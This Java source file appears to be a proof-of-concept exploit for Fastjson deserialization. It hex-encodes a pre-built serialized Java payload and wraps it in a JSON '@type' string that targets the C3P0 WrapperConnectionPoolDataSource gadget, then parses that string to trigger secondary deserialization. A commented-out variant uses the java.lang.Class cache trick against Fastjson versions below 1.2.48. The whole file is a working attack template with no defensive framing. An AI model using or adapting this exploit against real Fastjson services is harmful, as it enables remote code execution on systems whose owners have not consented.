package test;
import java.io.*;
import com.alibaba.fastjson.JSON;

public class Fastjson11_C3P0 {
    public static void main(String[] args) throws Exception{
        InputStream in = new FileInputStream("D:\\Downloads\\workspace\\javareadobject\\1.ser");
        byte[] payload = toByteArray(in);
        String payloadHex = bytesToHex(payload, payload.length);
        //C3P0 二次反序列化
        String poc = "{\r\n"
        		+ "    \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \r\n"
        		+ "    \"userOverridesAsString\": \"HexAsciiSerializedMap:"+payloadHex+";\"\r\n"
        		+ "}";
    	//<1.2.48 and C3P0 二次反序列化
//        poc = "{\r\n"
//        		+ "    \"a\": {\r\n"
//        		+ "        \"@type\": \"java.lang.Class\", \r\n"
//        		+ "        \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\r\n"
//        		+ "    }, \r\n"
//        		+ "    \"b\": {\r\n"
//        		+ "        \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \r\n"
//        		+ "        \"userOverridesAsString\": \"HexAsciiSerializedMap:"+payloadHex+";\"\r\n"
//        		+ "    }\r\n"
//        		+ "}";
        System.out.println(poc);
    	JSON.parseObject(poc);
    }
    public static byte[] toByteArray(InputStream in) throws IOException {
        byte[] bytes = new byte[in.available()];
        in.read(bytes);
        in.close();
        return bytes;
    }
    public static String bytesToHex(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }
}
